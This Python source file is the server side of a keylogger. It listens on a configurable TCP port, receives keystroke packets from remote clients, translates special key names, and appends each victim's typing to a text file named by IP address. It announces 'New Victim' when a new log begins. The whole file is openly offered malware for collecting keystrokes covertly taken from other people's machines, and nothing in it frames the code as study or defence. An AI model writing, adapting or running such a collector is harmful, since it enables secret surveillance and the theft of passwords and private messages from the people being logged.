import socket
from _thread import *
import threading
import os.path


def special_keys(key):
    match key:
        case "Key.backspace":
            return "BACK_KEY"
        case "Key.tab":
            return 'TAB_KEY\t'
        case "Key.space":
            return " "
        case "Key.enter":
            return 'ENTER_KEY\n'
        case "'":
            return"\'"
        case "Key.shift":
            return""
        case "Key.esc":
            return"ESC_KEY"
        case "Key.home":
            return"HOME_KEY"
        case "Key.end":
            return"END_KEY"
        case "Key.page_up":
            return"PGUP_KEY"
        case "Key.page_down":
            return"PGDOWN_KEY"
        case "Key.print_screen":
            return"PRTSC_KEY"
        case "Key.scroll_lock":
            return"SCROLLLOCK_KEY"
        case "Key.ctrl_l":
            return"CTRl_KEY"
        case "Key.ctrl_r":
            return"CTRl_KEY"
        case "Key.alt_l":
            return"ALT_KEY"
        case "Key.alt_gr":
            return"ALT_KEY"
        case "Key.menu":
            return"MENU_KEY"
        case "Key.cmd":
            return"WINDOWS_KEY"
        case "Key.left":
            return"LEFT_ARROW_KEY"
        case "Key.right":
            return"RIGHT_ARROW_KEY"
        case "Key.up":
            return"UP_ARROW_KEY"
        case "Key.down":
            return"DOWN_ARROW_KEY"
        case "Key.delete":
            return"DELETE_KEY"
        case "Key.insert":
            return"INSERT_KEY"
        case "Key.f1":
            return"F1_KEY"
        case "Key.f2":
            return"F2_KEY"
        case "Key.f3":
            return"F3_KEY"
        case "Key.f4":
            return"F4_KEY"
        case "Key.f5":
            return"F5_KEY"
        case "Key.f6":
            return"F6_KEY"
        case "Key.f7":
            return"F7_KEY"
        case "Key.f8":
            return"F8_KEY"
        case "Key.f9":
            return"F9_KEY"
        case "Key.f10":
            return"F10_KEY"
        case "Key.f11":
            return"F11_KEY"
        case "Key.f12":
            return"F12_KEY"
        case "Key.num_lock":
            return"NUMLOCK_KEY"
        case "<103>":
            return"7"
        case "<104>":
            return"8"
        case "<105>":
            return"9"
        case "<100>":
            return"4"
        case "<101>":
            return"5"
        case "<102>":
            return"6"
        case "<97>":
            return"1"
        case "<98>":
            return"2"
        case "<99>":
            return"3"
        case "<96>":
            return"0"
        case "<110>":
            return"."
        case _:
            return""

def write_file(name, key, caps):
    f = open(name, "a")
    if caps == True:
      f.write(key.upper())
    else:
      f.write(key)
    f.close()



def threaded(conn, addr):
    while True:
        caps_ctr = False
        # receive data stream. it won't accept data packet greater than 1024 bytes
        data = conn.recv(1024).decode()
        keys = str(data).split("&?")
        filename = addr[0]+"_"+keys[0]+"_"+keys[1]+".txt"
        if keys[2][0] == "'" and keys[2][2] == "'":
          keys[2] = keys[2].replace("'", "")
        elif keys[2][0] == '"' and keys[2][2] == '"':
          keys[2] = keys[2].replace('"', "")
        elif keys[2] == "Key.caps_lock":
          if caps_ctr == False:
            caps_ctr = True
          elif caps_ctr == True:
            caps_ctr = False
        else:
          keys[2] = special_keys(keys[2])
        if os.path.exists(filename) == False:
          print("New Victim, writing file"+filename)
        write_file(filename, keys[2], caps_ctr)
    conn.close()  # close the connection

def server_program():
    # get the hostname
    host = "x.x.x.x" # CHANGE THIS
    port = 2323  # CHANGE THIS

    server_socket = socket.socket()  # get instance
    
    server_socket.bind((host, port))  # bind host address and port together

    
    server_socket.listen()
    while True:

        # establish connection with client
        conn, addr = server_socket.accept()

        # lock acquired by client
        print('Connected to :', addr[0])

        threading.Thread(target=threaded,args=(conn, addr), daemon=True).start()
    conn.close()  # close the connection


if __name__ == '__main__':
    server_program()
